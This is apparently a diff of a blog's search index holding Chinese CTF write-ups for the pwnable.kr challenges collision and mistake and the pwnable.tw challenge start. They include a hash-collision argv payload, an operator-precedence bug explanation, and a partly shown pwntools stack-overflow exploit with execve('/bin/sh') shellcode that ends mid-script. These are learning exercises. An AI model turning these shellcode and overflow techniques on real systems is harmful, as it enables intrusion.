-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/7.png" class></strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;</span>)</span><br><span class="line"><span class="comment"># 这一inline的python表达式可以将生成的结果作为argv[1]参数</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/8.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>fd</title>
     <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/fd/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/fd/1.png" class></strong></p>
@@ -599,6 +727,41 @@
 <p>注意这里参数需要转为10进制   $0x1234_{16} = 4660_{10}$</p>
 <figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">flag: mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>collision</title>
+    <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/1.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/2.png" class></strong></p>
+<h3 id="查看C语言源代码"><a href="#查看C语言源代码" class="headerlink" title="查看C语言源代码"></a>查看C语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/3.png" class></strong></p>
+<h3 id="main-int-argc-char-argv"><a href="#main-int-argc-char-argv" class="headerlink" title="main(int argc, char* argv[])"></a><a href="https://blog.csdn.net/LYJ_viviani/article/details/51873961">main(int argc, char* argv[])</a></h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/4.png" class></strong></p>
+<p>传递三个参数$aa,bb,cc$, 程序运行结果如下:</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/5.png" class></strong></p>
+<p><strong>注意：若传递n个参数，实际上相当于给main函数传递了n+1个参数，argc=n+1（因为argv[0]是路径名自动传递）</strong></p>
+<h3 id="分析col-c"><a href="#分析col-c" class="headerlink" title="分析col.c"></a>分析col.c</h3><ul>
+<li>函数传递了两个参数，第一个参数为int型，第二个参数为一个字符数组，main函数首先判断第一个参数如果小于2,即若不显式传递参数，则打印argv[0]之后会直接退出。</li>
+<li>argv[1]，即传入的第二个参数，第一个参数为文件所在路径，指向的字符串的长度需要等于20字节。</li>
+<li>check_password函数将指向20字节的字符指针转为int指针，因为int是4字节，即将20字节字符串拆分成为5个int类型的数据，之后求和。</li>
+<li>如果求和的结果和给定的哈希值0x21DD09EC相等，则会执行system函数拿到flag。</li>
+</ul>
+<p>最直接的想法是暴力穷举，寻找哈希碰撞，但实际上这里可以直接凑出这个哈希值，可以令20字节的前16字节都设置为0x01，<strong>注意不能设置为0x00</strong>，因为0x00是一个截断字符，程序读入argv[1]时如果遇到了0x00会自动截断，从而导致程序结果有误。</p>
+<p>另外，注意数据按照小端序存放：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/6.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/7.png" class></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;</span>)</span><br><span class="line"><span class="comment"># 这一inline的python表达式可以将生成的结果作为argv[1]参数</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/8.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -700,34 +863,6 @@
       </tags>
   </entry>
   <entry>
-    <title>mistake</title>
-    <url>/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/1.png" class></strong></p>
-<h3 id="查看mistake-c源文件"><a href="#查看mistake-c源文件" class="headerlink" title="查看mistake.c源文件"></a>查看mistake.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                s[i] ^= XORKEY;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">        sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// xor your input</span></span><br><span class="line">        <span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>整个程序的执行逻辑为，打开系统目录下保存密码的文件，之后开辟了一个数组读取该密码文件中的密码并保存，之后由用户输入10字节长的密码，存放到一个新的数组中，将用户输入的密码进行与$0x1$进行异或（按位取反）操作，之后将两个数组的内容进行比较，如果数组中的内容相同，则验证通过，可执行system函数拿到flag。</p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>最自然的想法是直接爆破10位用户的密码，但代码中打印“do not bruteforce”，并且在题目中提示<em>operator priority</em>，因此审查源代码中存在两个运算符以上的语句：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/2.png" class></strong></p>
-<p>这里$&lt;$运算符的优先级高于$=$运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对。这里的正确写法如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>而另一方面，<strong>0作为文件描述符，它指向的是stdin</strong>。</p>
-<p>因此，后面的read函数实际上是从stdin读取，而不是password文件，而stdin我们可以控制，则我们可以输入任意已知的密码，之后再输入与$0x1$异或的值，使得两次输入的密码相匹配。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/3.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>passcode</title>
     <url>/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/passcode/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/passcode/11.png" class></strong></p>
@@ -781,6 +916,34 @@
 <p>所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。</p>
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>求出$0x6b8b4567\oplus 0xdeadbeef$的值输入即可</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/7.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mistake</title>
+    <url>/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/1.png" class></strong></p>
+<h3 id="查看mistake-c源文件"><a href="#查看mistake-c源文件" class="headerlink" title="查看mistake.c源文件"></a>查看mistake.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                s[i] ^= XORKEY;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">        sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// xor your input</span></span><br><span class="line">        <span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个程序的执行逻辑为，打开系统目录下保存密码的文件，之后开辟了一个数组读取该密码文件中的密码并保存，之后由用户输入10字节长的密码，存放到一个新的数组中，将用户输入的密码进行与$0x1$进行异或（按位取反）操作，之后将两个数组的内容进行比较，如果数组中的内容相同，则验证通过，可执行system函数拿到flag。</p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>最自然的想法是直接爆破10位用户的密码，但代码中打印“do not bruteforce”，并且在题目中提示<em>operator priority</em>，因此审查源代码中存在两个运算符以上的语句：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/2.png" class></strong></p>
+<p>这里$&lt;$运算符的优先级高于$=$运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对。这里的正确写法如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>而另一方面，<strong>0作为文件描述符，它指向的是stdin</strong>。</p>
+<p>因此，后面的read函数实际上是从stdin读取，而不是password文件，而stdin我们可以控制，则我们可以输入任意已知的密码，之后再输入与$0x1$异或的值，使得两次输入的密码相匹配。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/PWN/Pwnable_kr/mistake/3.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -896,118 +1059,6 @@
         <category>PWN</category>
         <category>Pwnable.kr</category>
         <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>start</title>
-    <url>/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/1.png" class></strong></p>
-<h3 id="检查文件保护措施"><a href="#检查文件保护措施" class="headerlink" title="检查文件保护措施"></a>检查文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/11/04/PWN/Pwnable_xyz/start/2.png" class></strong></p>
-<p><strong>RELRO(Relocation Read Only)：尽量使存储区域只读</strong></p>
-<h3 id="IDA32查看文件"><a href="#IDA32查看文件" class="headerlink" title="IDA32查看文件"></a>IDA32查看文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">3</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span>     <span class="number">80</span>h; LINUX - sys_write</span><br><span class="line">    <span class="keyword">int</span>     <span class="number">80</span>h; LINUX -</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>其对应的汇编代码：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">保存现场环境esp、_exit</span><br><span class="line">.text:<span class="number">08048060</span>                 push    esp</span><br><span class="line">.text:<span class="number">08048061</span>                 push    offset _exit</span><br><span class="line"></span><br><span class="line">清空寄存器EAX EBX ECX EDX</span><br><span class="line">.text:<span class="number">08048066</span>                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">08048068</span>                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0804806</span>A                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">0804806</span>C                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line"></span><br><span class="line">向栈上压入参数</span><br><span class="line">.text:<span class="number">0804806</span>E                 push    <span class="number">3</span>A465443h    CTF:</span><br><span class="line">.text:<span class="number">08048073</span>                 push    <span class="number">20656874</span>h    the</span><br><span class="line">.text:<span class="number">08048078</span>                 push    <span class="number">20747261</span>h    art</span><br><span class="line">.text:<span class="number">0804807</span>D                 push    <span class="number">74732073</span>h    s st</span><br><span class="line">.text:<span class="number">08048082</span>                 push    <span class="number">2774654</span>Ch    Let’</span><br><span class="line"></span><br><span class="line">系统调用<span class="number">80</span>h</span><br><span class="line">.text:<span class="number">08048087</span>                 mov     ecx, esp        ; addr</span><br><span class="line">.text:<span class="number">08048089</span>                 mov     dl, <span class="number">14</span>h         ; len</span><br><span class="line">.text:<span class="number">0804808B</span>                 mov     bl, <span class="number">1</span>           ; fd</span><br><span class="line">.text:<span class="number">0804808</span>D                 mov     al, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804808F</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_write</span><br><span class="line"></span><br><span class="line">系统调用<span class="number">80</span>h</span><br><span class="line">.text:<span class="number">08048091</span>                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">08048093</span>                 mov     dl, <span class="number">3</span>Ch</span><br><span class="line">.text:<span class="number">08048095</span>                 mov     al, <span class="number">3</span></span><br><span class="line">.text:<span class="number">08048097</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX -</span><br><span class="line"></span><br><span class="line">恢复栈平衡，返回到_exit</span><br><span class="line">.text:<span class="number">08048099</span>                 add     esp, <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0804809</span>C                 retn</span><br><span class="line">.text:<span class="number">0804809</span>C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
-
-<p>函数结构很简单，采用<code>int 80</code>调用了两个系统调用，下面先补充<code>int 80</code>系统调用的细节：</p>
-<blockquote>
-<p>1． 执行用户程序(如:fork)<br>2． 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。<br>3． 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式）<br>4． 进行中断处理，根据系统调用表调用内核函数。<br>5． 执行内核函数。<br>6． 执行RESTORE_ALL并返回用户模式<br>Linux 32位的系统调用时通过int 80h来实现的，<strong>eax寄存器中为调用的功能号</strong>，ebx、ecx、edx、esi等等寄存器则依次为参数。</p>
-</blockquote>
-<p><a href="https://blog.csdn.net/qq_29343201/article/details/52209588">系统调用功能号</a></p>
-<p>这里使用的两个系统调用信息如下：</p>
-<h4 id="第一个系统调用："><a href="#第一个系统调用：" class="headerlink" title="第一个系统调用："></a><strong>第一个系统调用：</strong></h4><p>将esp开始的14h字节数据写入标准输出（文件描述符1），即输出”Let’s start the CTF:”</p>
-<table>
-<thead>
-<tr>
-<th align="left">name</th>
-<th align="left">eax</th>
-<th align="left">ebx</th>
-<th align="left">ecx</th>
-<th align="left">edx</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html">sys_write</a></td>
-<td align="left">0x04</td>
-<td align="left">unsigned int fd = 1</td>
-<td align="left">const char __user *buf = esp</td>
-<td align="left">size_t count =14h</td>
-</tr>
-</tbody></table>
-<h4 id="第二个系统调用"><a href="#第二个系统调用" class="headerlink" title="第二个系统调用"></a>第二个系统调用</h4><p>从标准输入读取3ch字节到栈空间。</p>
-<table>
-<thead>
-<tr>
-<th align="left">name</th>
-<th align="left">eax</th>
-<th align="left">ebx</th>
-<th align="left">ecx</th>
-<th align="left">edx</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html">sys_read</a></td>
-<td align="left">0x03</td>
-<td align="left">unsigned int fd = 1</td>
-<td align="left">char __user *buf = esp</td>
-<td align="left">size_t count = 3ch</td>
-</tr>
-</tbody></table>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><h4 id="1-程序执行到0804808F"><a href="#1-程序执行到0804808F" class="headerlink" title="1 .程序执行到0804808F"></a>1 .程序执行到0804808F</h4><p>sys_write，输出14h字节数据：Let’s start the CTF:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	+-----------------+      &lt;----</span><br><span class="line">    |       Let’      |         |     </span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       s st      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       art       |        <span class="number">14</span>h</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       the       |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       CTF:      |         |</span><br><span class="line">    +-----------------+      &lt;-----</span><br><span class="line">    |   offset _exit  |</span><br><span class="line">    +-----------------+</span><br><span class="line">    |    Saved ESP    |</span><br><span class="line">H-&gt; +-----------------+</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-程序执行到08048097"><a href="#2-程序执行到08048097" class="headerlink" title="2.程序执行到08048097"></a>2.程序执行到08048097</h4><p>sys_read，read函数最多可以读取3ch字节，超出了分配的空间，可以用来覆盖ret_addr和esp。经调试验证，20字节后覆盖ret，24字节后覆盖esp。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    +-----------------+      &lt;----</span><br><span class="line">    |       aaaa      |         |     </span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |        <span class="number">14</span>h</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+      &lt;-----</span><br><span class="line">    |       aaaa      |</span><br><span class="line">    +-----------------+</span><br><span class="line">    |    Saved ESP    |</span><br><span class="line">H-&gt; +-----------------+</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-泄露ESP"><a href="#3-泄露ESP" class="headerlink" title="3.泄露ESP"></a>3.泄露ESP</h4><p>现在EIP已经在我们的掌控之中了，关键是如何跳转到布置的shell code中。一般来说，首先会去找JMP ESP指令，这样就能让shellcode获得执行。但这段汇编代码没有，可以利用的只有read和write。如果可以write出Saved ESP的地址，然后覆盖掉offset _exit，就能成功shell。</p>
-<h4 id="4-覆盖RET"><a href="#4-覆盖RET" class="headerlink" title="4. 覆盖RET"></a>4. 覆盖RET</h4><p>此时程序已经泄露出之前的Saved_esp，栈的情况已经摸清了，然后程序继续执行read，注意read完 add esp, 14h后再ret，因此，ret_addr在esp+14h的地方。</p>
-<h4 id="5-shellcode-原理"><a href="#5-shellcode-原理" class="headerlink" title="5. shellcode(原理)"></a>5. shellcode(原理)</h4><p>shellcode同样可以用系统调用的方式执行execve(“/bin/sh”,NULL,NULL)</p>
-<table>
-<thead>
-<tr>
-<th align="left">name</th>
-<th align="left">eax</th>
-<th align="left">ebx</th>
-<th align="left">ecx</th>
-<th align="left">edx</th>
-<th align="left">esi</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">sys_execve</a></td>
-<td align="left">0x0b</td>
-<td align="left">char __user *</td>
-<td align="left">char <strong>user *</strong>user *</td>
-<td align="left">char <strong>user *</strong>user *</td>
-<td align="left"><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19">struct pt_regs</a></td>
-</tr>
-</tbody></table>
-<p>其中，该程序是 32 位，所以我们需要使得</p>
-<ul>
-<li>系统调用号，即 eax 应该为 0xb</li>
-<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
-<li>第二个参数，即 ecx 应该为 0</li>
-<li>第三个参数，即 edx 应该为 0</li>
-</ul>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">xor</span> eax,eax</span><br><span class="line">push eax</span><br><span class="line">push %s</span><br><span class="line">push %s</span><br><span class="line">mov ebx, esp</span><br><span class="line"><span class="keyword">xor</span> ecx,ecx</span><br><span class="line"><span class="keyword">xor</span> edx,edx</span><br><span class="line">mov al, <span class="number">0xb</span></span><br><span class="line">int 0x80&#x27;&#x27;&#x27; %(u32(&#x27;/sh\0&#x27;),u32(&#x27;/bin&#x27;))</span><br></pre></td></tr></table></figure>
-
-<p>使用asm(shellcode)来进行汇编,可以使用context来指定cpu类型以及操作系统。</p>
-<p>如：<code>context(arch = ‘amd64’ , os = ‘linux’, log_level=”debug”)</code></p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">rem = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#等待write执行完毕</span></span><br><span class="line">rem.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送溢出数据，覆盖ret为0x08048087-&gt;输出14h字节</span></span><br><span class="line">line = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">rem.send(line)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收输出数据，其中就有Saved ESP</span></span><br><span class="line">stack_addr = rem.recv()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接使用网上的shellcode</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"><span class="comment">#参考覆盖RET分析</span></span><br><span class="line">shellcode_addr = 